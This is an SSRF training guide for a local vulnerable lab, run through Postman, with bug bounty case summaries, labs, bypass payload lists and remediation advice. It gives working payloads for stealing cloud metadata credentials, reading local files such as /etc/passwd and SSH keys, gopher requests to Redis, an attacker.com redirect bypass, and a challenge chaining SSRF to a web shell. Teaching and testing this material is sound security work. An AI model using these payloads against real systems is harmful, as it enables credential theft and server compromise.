# Server-Side Request Forgery (SSRF) Testing Labs with Postman

## Table of Contents
1. [What is SSRF?](#what-is-ssrf)
2. [Real-World Bug Bounty Examples](#real-world-bug-bounty-examples)
3. [Lab Setup](#lab-setup)
4. [Basic SSRF Testing](#basic-ssrf-testing)
5. [Blind SSRF Detection](#blind-ssrf-detection)
6. [Cloud Metadata Attacks](#cloud-metadata-attacks)
7. [Advanced SSRF Techniques](#advanced-ssrf-techniques)
8. [Bypass Techniques](#bypass-techniques)
9. [Remediation and Prevention](#remediation-and-prevention)
10. [Practice Challenges](#practice-challenges)

---

## What is SSRF?

Server-Side Request Forgery (SSRF) is a security vulnerability that lets hackers make a web server send requests to places it shouldn't. Instead of directly attacking a website, the attacker tricks the server into doing the dirty work for them.

Think of it like this: Imagine you have a helpful assistant who can fetch things for you from anywhere in your office building. Now imagine a bad guy telling your assistant to "go grab the password list from the locked manager's office." Your assistant has access to places you don't, so the bad guy uses your assistant to reach restricted areas.

### Why Is This Dangerous?

SSRF attacks are especially powerful because servers often have special access that regular users don't:

- **Internal Network Access:** Servers can reach internal systems that are hidden from the internet
- **Cloud Metadata:** Servers running in the cloud can access sensitive configuration data
- **Privileged Ports:** Servers can connect to restricted ports that normal users can't reach
- **Trusted Relationships:** Other systems trust requests coming from your server
- **Bypass Firewalls:** SSRF lets attackers reach systems protected by firewalls

### Common SSRF Scenarios

SSRF vulnerabilities show up in many places:
- URL fetchers (importing data from URLs)
- Webhook systems (notifying external services)
- Image processors (loading images from URLs)
- File import features (downloading files)
- PDF generators (fetching remote resources)
- API integrations (calling third-party APIs)

---

## Real-World Bug Bounty Examples

Let's examine real cases where security researchers discovered SSRF vulnerabilities and earned significant bounties:

### Example 1: Capital One AWS Metadata SSRF ($100,000+)

**The Company:** Capital One (major financial institution)
**Impact:** 100 million customer records exposed
**Year:** 2019

**What Happened:**
A former AWS employee exploited an SSRF vulnerability in Capital One's web application firewall configuration. The vulnerability allowed access to AWS metadata endpoints, which contained temporary security credentials.

**The Attack:**
The attacker used SSRF to access the AWS metadata endpoint:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

This exposed temporary AWS credentials that gave access to S3 buckets containing customer data including:
- Social Security numbers
- Bank account numbers
- Credit scores
- Transaction data

**The Impact:**
- Over 100 million people affected
- $80 million in fines
- Massive reputation damage
- Criminal charges filed

**Lesson Learned:** Always restrict access to cloud metadata endpoints and implement proper network segmentation. Never assume internal resources are safe from SSRF attacks.

### Example 2: Shopify Internal Port Scanner SSRF ($25,000)

**The Company:** Shopify (e-commerce platform)
**Bounty Amount:** $25,000
**Year:** 2017

**What Happened:**
A researcher discovered that Shopify's "export products" feature, which could fetch product data from external URLs, didn't properly validate the destination. This allowed him to scan Shopify's internal network.

**The Attack:**
By providing internal URLs in the export feature:
```
http://127.0.0.1:6379/  (Redis database)
http://127.0.0.1:8080/  (Internal admin panel)
http://10.0.0.5:22/     (SSH service)
```

The researcher could:
- Map Shopify's internal network architecture
- Identify running services on internal ports
- Access internal admin interfaces
- Read data from internal databases

**The Payout:**
Shopify paid $25,000 for this critical finding because it could have led to complete system compromise.

**Lesson Learned:** Implement strict URL validation with allowlists, not just blocklists. Restrict internal network access and monitor for unusual request patterns.

### Example 3: GitLab SSRF File Read ($12,000)

**The Company:** GitLab (DevOps platform)
**Bounty Amount:** $12,000
**Year:** 2020

**What Happened:**
GitLab's project import feature allowed users to import projects from URLs. A researcher discovered that by using the `file://` protocol, he could read local files from the server.

**The Attack:**
```
file:///etc/passwd
file:///proc/self/environ
file:///home/git/.ssh/id_rsa
```

This allowed reading:
- System configuration files
- Environment variables with secrets
- SSH private keys
- Application configuration files

The researcher could have escalated this to full server compromise by reading SSH keys or database credentials.

**Lesson Learned:** Restrict URL schemes to only what's necessary (usually just http/https). Implement proper input validation for all user-supplied URLs.

### Example 4: Slack SSRF to Internal Services ($3,500)

**The Company:** Slack (business communication platform)
**Bounty Amount:** $3,500
**Year:** 2018

**What Happened:**
Slack's link preview feature would fetch content from URLs to show previews in chat. A researcher found that this feature could be used to probe internal services.

**The Attack:**
By posting links in Slack channels:
```
http://169.254.169.254/latest/meta-data/
http://localhost:5984/_utils/
http://127.0.0.1:27017/
```

The attacker could:
- Access AWS metadata credentials
- Interact with internal databases
- Probe for internal services
- Potentially leak sensitive data through timing attacks

**Lesson Learned:** Link preview and URL fetching features need strict validation and should run in isolated environments with no access to internal networks.

---

## Lab Setup

### Prerequisites

Before starting these labs, make sure you have:
- Postman installed (see `01_INSTALLATION_GUIDE.md`)
- AegisForge running on `http://localhost:5000`
- Basic understanding of HTTP requests (see `02_POSTMAN_BASICS.md`)

### Starting AegisForge

1. Open a terminal in the AegisForge directory
2. Start the application:
   ```bash
   python aegisforge_api.py
   ```
3. Verify it's running by visiting: `http://localhost:5000`

### SSRF Endpoints Available

AegisForge provides several SSRF testing endpoints:

| Endpoint | Purpose |
|----------|---------|
| `/api/ssrf/fetch` | Basic URL fetching |
| `/api/ssrf/webhook` | Webhook callback testing |
| `/api/ssrf/image` | Image loading from URLs |
| `/api/ssrf/blind` | Blind SSRF scenarios |
| `/api/ssrf/metadata` | Cloud metadata simulation |

### Setting Up Postman Collection

1. Open Postman
2. Create a new collection called "SSRF Testing Labs"
3. Add the AegisForge base URL as a collection variable:
   - Variable: `baseUrl`
   - Value: `http://localhost:5000`

---

## Basic SSRF Testing

Let's start with simple SSRF attacks to understand how they work.

### Lab 1: Simple URL Fetch SSRF

**Objective:** Make the server fetch content from an external URL.

**Steps:**

1. Create a new POST request in Postman
2. Set URL: `{{baseUrl}}/api/ssrf/fetch`
3. Set Headers:
   ```
   Content-Type: application/json
   ```
4. Set Body (raw JSON):
   ```json
   {
     "url": "http://example.com"
   }
   ```
5. Send the request

**Expected Response:**
```json
{
  "status": "success",
  "content": "<!doctype html>...",
  "fetched_from": "http://example.com"
}
```

**What Happened:**
The server fetched content from example.com and returned it. This proves the server can make external requests on your behalf.

### Lab 2: Internal Network Probing

**Objective:** Access internal services that aren't exposed to the internet.

**Steps:**

1. Try accessing localhost:
   ```json
   {
     "url": "http://localhost:5000/api/users"
   }
   ```

2. Try accessing internal IP ranges:
   ```json
   {
     "url": "http://127.0.0.1:5000/api/admin"
   }
   ```

3. Try different internal ports:
   ```json
   {
     "url": "http://localhost:8080"
   }
   ```

**What to Look For:**
- Different response codes (200, 403, 404, 500)
- Response timing (closed ports timeout faster)
- Error messages revealing internal structure
- Successful data retrieval from internal APIs

### Lab 3: Port Scanning via SSRF

**Objective:** Discover what services are running on internal ports.

**Steps:**

1. Create requests for common ports:
   - Port 22 (SSH): `http://127.0.0.1:22`
   - Port 80 (HTTP): `http://127.0.0.1:80`
   - Port 443 (HTTPS): `http://127.0.0.1:443`
   - Port 3306 (MySQL): `http://127.0.0.1:3306`
   - Port 5432 (PostgreSQL): `http://127.0.0.1:5432`
   - Port 6379 (Redis): `http://127.0.0.1:6379`
   - Port 27017 (MongoDB): `http://127.0.0.1:27017`

2. Use Postman's Collection Runner:
   - Create a data file with port numbers
   - Run all requests automatically
   - Compare response times and errors

**Analysis:**
- Open ports return different responses than closed ports
- Connection refused = port closed
- Timeout = filtered/firewalled
- Unexpected data = service responded

---

## Blind SSRF Detection

Blind SSRF is when you can make the server send requests, but you can't see the response. Detection requires creative techniques.

### Lab 4: Time-Based Blind SSRF

**Objective:** Detect SSRF by measuring response times.

**Steps:**

1. Request a URL that will timeout:
   ```json
   {
     "url": "http://192.168.1.999:80"
   }
   ```

2. Request a URL that responds quickly:
   ```json
   {
     "url": "http://127.0.0.1:80"
   }
   ```

3. Compare response times in Postman:
   - Look at the "Time" value in the response
   - Closed ports: 1-2 seconds (connection refused)
   - Open ports: Almost instant
   - Filtered ports: 20+ seconds (timeout)

### Lab 5: Out-of-Band (OOB) Detection

**Objective:** Use external services to detect blind SSRF.

**Tools You Can Use:**
- Burp Collaborator
- Interactsh (https://app.interactsh.com)
- Webhook.site
- RequestBin

**Steps:**

1. Get a unique URL from Interactsh:
   - Visit https://app.interactsh.com
   - Copy your unique subdomain (e.g., `abc123.interact.sh`)

2. Send SSRF request with your URL:
   ```json
   {
     "url": "http://abc123.interact.sh"
   }
   ```

3. Check Interactsh dashboard for incoming requests

**What This Proves:**
If you see a request in Interactsh, the server definitely made an outbound connection, confirming SSRF even if you can't see the response in Postman.

### Lab 6: DNS-Based Detection

**Objective:** Detect SSRF through DNS queries.

**Steps:**

1. Use a DNS logger service like Interactsh or Burp Collaborator
2. Send request:
   ```json
   {
     "url": "http://your-unique-id.burpcollaborator.net"
   }
   ```

3. Check for DNS lookups

**Why This Works:**
Even if the HTTP request is blocked, the server must do a DNS lookup first. Seeing a DNS query proves SSRF exists.

---

## Cloud Metadata Attacks

Cloud providers like AWS, Azure, and GCP provide metadata services that give servers information about themselves. These are goldmines for attackers.

### Lab 7: AWS Metadata Exploitation

**Objective:** Access AWS instance metadata to steal credentials.

**AWS Metadata Endpoint:** `http://169.254.169.254/`

**Steps:**

1. **Discover the metadata endpoint:**
   ```json
   {
     "url": "http://169.254.169.254/latest/meta-data/"
   }
   ```

2. **List IAM roles:**
   ```json
   {
     "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
   }
   ```

3. **Steal credentials:**
   ```json
   {
     "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
   }
   ```

**What You Get:**
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-01T00:00:00Z"
}
```

**Using Stolen Credentials:**
These credentials can be used with AWS CLI to access S3 buckets, databases, and other AWS services.

### Lab 8: Azure Metadata Attack

**Objective:** Access Azure instance metadata.

**Azure Metadata Endpoint:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01`

**Steps:**

1. **Access Azure metadata (requires special header):**
   ```json
   {
     "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     "headers": {
       "Metadata": "true"
     }
   }
   ```

2. **Get managed identity token:**
   ```json
   {
     "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
     "headers": {
       "Metadata": "true"
     }
   }
   ```

**What You Get:**
- Instance information
- Network configuration
- Access tokens for Azure resources
- Managed identity credentials

### Lab 9: Google Cloud Metadata

**Objective:** Access GCP instance metadata.

**GCP Metadata Endpoint:** `http://metadata.google.internal/computeMetadata/v1/`

**Steps:**

1. **Access GCP metadata (requires special header):**
   ```json
   {
     "url": "http://metadata.google.internal/computeMetadata/v1/instance/",
     "headers": {
       "Metadata-Flavor": "Google"
     }
   }
   ```

2. **Get service account token:**
   ```json
   {
     "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
     "headers": {
       "Metadata-Flavor": "Google"
     }
   }
   ```

3. **List service accounts:**
   ```json
   {
     "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
     "headers": {
       "Metadata-Flavor": "Google"
     }
   }
   ```

**What You Get:**
- OAuth access tokens
- Service account credentials
- Project information
- Instance attributes

---

## Advanced SSRF Techniques

### Lab 10: Protocol Smuggling

**Objective:** Use different protocols to access resources.

**File Protocol:**
```json
{
  "url": "file:///etc/passwd"
}
```

**FTP Protocol:**
```json
{
  "url": "ftp://internal-ftp.company.com/files/"
}
```

**Gopher Protocol (dangerous!):**
```json
{
  "url": "gopher://127.0.0.1:6379/_GET%20key"
}
```

**Why Gopher is Powerful:**
Gopher can interact with many internal services like Redis, Memcached, and SMTP because it allows raw TCP connections.

### Lab 11: URL Encoding Tricks

**Objective:** Bypass basic SSRF filters using encoding.

**IP Address Representations:**

1. **Decimal format:**
   - `http://127.0.0.1/` → `http://2130706433/`
   - Calculation: (127 × 256³) + (0 × 256²) + (0 × 256) + 1

2. **Octal format:**
   - `http://127.0.0.1/` → `http://0177.0.0.1/`

3. **Hexadecimal:**
   - `http://127.0.0.1/` → `http://0x7f.0x0.0x0.0x1/`

4. **Mixed formats:**
   - `http://127.1/` (shorthand)
   - `http://localhost/`
   - `http://[::1]/` (IPv6 localhost)

### Lab 12: DNS Rebinding

**Objective:** Bypass SSRF protections using DNS tricks.

**How It Works:**
1. Create a domain that resolves to a safe IP first
2. Application checks and approves it
3. DNS record changes to point to internal IP
4. Application makes request to internal IP

**Testing:**
Use services like:
- `7f000001.1time.nip.io` (resolves to 127.0.0.1 once)
- Custom DNS servers with low TTL values

---

## Bypass Techniques

### Common SSRF Filters and How to Bypass Them

#### Filter 1: Blocklist of "localhost"

**Bypass Methods:**

1. **Use IP instead:**
   ```
   http://127.0.0.1/
   ```

2. **Alternative localhost names:**
   ```
   http://localtest.me/
   http://127.1/
   http://0.0.0.0/
   ```

3. **URL encoding:**
   ```
   http://loc%61lhost/
   ```

#### Filter 2: Blocklist of 127.0.0.1

**Bypass Methods:**

1. **Decimal IP:**
   ```
   http://2130706433/
   ```

2. **Different IP notations:**
   ```
   http://127.0.0.1.nip.io/
   http://127.1/
   http://0/
   ```

3. **IPv6 localhost:**
   ```
   http://[::1]/
   http://[0:0:0:0:0:0:0:1]/
   ```

#### Filter 3: Blocklist of Private IPs

**Bypass Methods:**

1. **Use DNS rebinding**
2. **URL redirects:**
   - Create a public URL that redirects to internal IP
   ```
   http://attacker.com/redirect.php?url=http://192.168.1.1/
   ```

3. **IPv6 private addresses**

#### Filter 4: URL Parsing Issues

**Bypass Methods:**

1. **URL fragments:**
   ```
   http://allowed.com@127.0.0.1/
   ```

2. **URL credentials:**
   ```
   http://user:pass@internal-server/
   ```

3. **URL encoding in hostname:**
   ```
   http://127.0.0.1%2F@allowed.com/
   ```

### Testing Bypass Techniques in Postman

Create a collection with these payloads and run them systematically:

```json
{
  "payloads": [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://2130706433/",
    "http://0177.0.0.1/",
    "http://127.1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://localtest.me/",
    "http://127.0.0.1.nip.io/"
  ]
}
```

Use Postman's data files to test all variations quickly.

---

## Remediation and Prevention

### For Developers

#### 1. Implement Allowlists

**Bad (blocklist approach):**
```python
blocked = ['127.0.0.1', 'localhost', '169.254.169.254']
if url in blocked:
    return "Blocked"
```

**Good (allowlist approach):**
```python
allowed_domains = ['api.example.com', 'cdn.example.com']
parsed = urlparse(url)
if parsed.hostname not in allowed_domains:
    return "Not allowed"
```

#### 2. Disable Unnecessary Protocols

```python
allowed_protocols = ['http', 'https']
parsed = urlparse(url)
if parsed.scheme not in allowed_protocols:
    return "Protocol not allowed"
```

#### 3. Use Network Segmentation

- Run URL fetching services in isolated networks
- Block access to cloud metadata endpoints
- Use security groups/firewall rules
- Implement VPC/network boundaries

#### 4. Validate After DNS Resolution

```python
import socket
import ipaddress

def is_private_ip(hostname):
    try:
        ip = socket.gethostbyname(hostname)
        return ipaddress.ip_address(ip).is_private
    except:
        return True

if is_private_ip(parsed.hostname):
    return "Private IP not allowed"
```

#### 5. Implement Rate Limiting

- Limit number of requests per user
- Prevent automated scanning
- Monitor for suspicious patterns

#### 6. Add Authentication for Internal APIs

- Don't rely on network location alone
- Require API keys or tokens
- Implement proper authentication

#### 7. Remove Sensitive Data from Metadata

- Don't store credentials in cloud metadata
- Use short-lived tokens
- Implement IMDSv2 on AWS (requires token)

### For Security Testers

#### What to Test:

1. **All URL input fields:**
   - File upload features
   - Webhook configurations
   - API integrations
   - PDF generators
   - Image processors

2. **Different protocols:**
   - http, https, file, ftp, gopher, dict, ldap

3. **Internal network access:**
   - Localhost (all variations)
   - Private IP ranges (192.168.x.x, 10.x.x.x, 172.16-31.x.x)
   - Cloud metadata endpoints

4. **Response analysis:**
   - Timing differences
   - Error messages
   - Partial content leakage

#### Testing Checklist:

- [ ] Test basic SSRF with external URL
- [ ] Try accessing localhost
- [ ] Test all localhost variations
- [ ] Scan for open internal ports
- [ ] Test cloud metadata endpoints
- [ ] Try different protocols (file, ftp, etc.)
- [ ] Test URL encoding bypasses
- [ ] Test with IP address variations
- [ ] Set up OOB detection
- [ ] Test for blind SSRF with timing
- [ ] Try DNS rebinding
- [ ] Test URL parsing bypasses
- [ ] Check for response data leakage

---

## Practice Challenges

### Challenge 1: Basic SSRF Discovery (Easy)

**Goal:** Find and exploit a basic SSRF vulnerability.

**Steps:**
1. Use the `/api/ssrf/fetch` endpoint
2. Make it fetch content from `http://localhost:5000/api/admin`
3. Extract sensitive information from the response

**Success Criteria:**
- You receive data from an internal endpoint
- You can read information not accessible directly

### Challenge 2: Blind SSRF Detection (Medium)

**Goal:** Detect SSRF without seeing the response.

**Steps:**
1. Use the `/api/ssrf/blind` endpoint
2. Set up an Interactsh or Webhook.site listener
3. Make the server send a request to your listener
4. Confirm the SSRF by seeing the incoming request

**Success Criteria:**
- You receive a callback at your listener
- You can prove the vulnerability exists

### Challenge 3: Cloud Metadata Extraction (Medium)

**Goal:** Extract cloud metadata credentials.

**Steps:**
1. Use the `/api/ssrf/metadata` endpoint
2. Access the simulated cloud metadata service
3. Extract the IAM role credentials
4. Document what an attacker could do with these credentials

**Success Criteria:**
- You extract AccessKeyId, SecretAccessKey, and Token
- You understand the impact of this data exposure

### Challenge 4: Filter Bypass (Hard)

**Goal:** Bypass SSRF protections.

**Steps:**
1. The endpoint blocks "localhost" and "127.0.0.1"
2. Find alternative ways to access localhost
3. Use encoding, IP variations, or DNS tricks
4. Successfully access internal services

**Success Criteria:**
- You bypass the filter
- You access internal endpoints despite restrictions

### Challenge 5: Port Scanning via SSRF (Hard)

**Goal:** Map the internal network.

**Steps:**
1. Use Postman's Collection Runner
2. Create a data file with ports 1-1000
3. Systematically scan for open ports
4. Identify running services
5. Create a network diagram

**Success Criteria:**
- You identify at least 5 open ports
- You determine what services are running
- You document the internal network structure

### Challenge 6: Full Exploitation Chain (Expert)

**Goal:** Chain SSRF with other vulnerabilities.

**Steps:**
1. Use SSRF to access internal Redis database
2. Use Redis commands via Gopher protocol
3. Write a web shell to the server
4. Execute commands through the web shell
5. Document the complete attack chain

**Success Criteria:**
- Successful command execution on the server
- Complete documentation of all steps
- Proper remediation recommendations

---

## Additional Resources

### Tools for SSRF Testing

1. **Burp Suite:**
   - Collaborator for OOB detection
   - Intruder for automated testing
   - Repeater for manual testing

2. **Interactsh:**
   - Free OOB detection service
   - DNS and HTTP logging
   - https://app.interactsh.com

3. **SSRFmap:**
   - Automated SSRF testing tool
   - Multiple modules and exploits
   - https://github.com/swisskyrepo/SSRFmap

4. **Webhook.site:**
   - Simple HTTP request logger
   - Real-time request viewing
   - https://webhook.site

### Learning Resources

- PortSwigger Web Security Academy (SSRF labs)
- HackerOne disclosed reports (search for SSRF)
- OWASP Testing Guide (SSRF section)
- PayloadsAllTheThings (SSRF payloads)

### Important Notes

⚠️ **Legal Warning:** Only test SSRF on systems you own or have explicit permission to test. Unauthorized testing is illegal.

⚠️ **Responsible Disclosure:** If you find SSRF vulnerabilities in production systems, report them responsibly through proper channels.

⚠️ **Impact Assessment:** Always consider the impact of your testing. Don't exploit vulnerabilities beyond what's needed to prove they exist.

---

## Summary

SSRF is a powerful vulnerability that lets attackers:
- Access internal networks and services
- Steal cloud credentials
- Bypass firewall restrictions
- Port scan internal infrastructure
- Read local files
- Interact with internal APIs

Key takeaways:
1. Always validate and sanitize URLs
2. Use allowlists, not blocklists
3. Implement network segmentation
4. Protect cloud metadata endpoints
5. Monitor for unusual outbound requests
6. Test thoroughly with various bypass techniques

Remember: The best defense is multiple layers of protection. Never rely on a single security control.

---

**Next Steps:**
- Complete all practice challenges
- Review the remediation section thoroughly
- Try combining SSRF with other vulnerabilities
- Read real bug bounty reports for inspiration
- Practice on legal platforms like HackerOne's CTF challenges

**Happy Testing! 🔐**
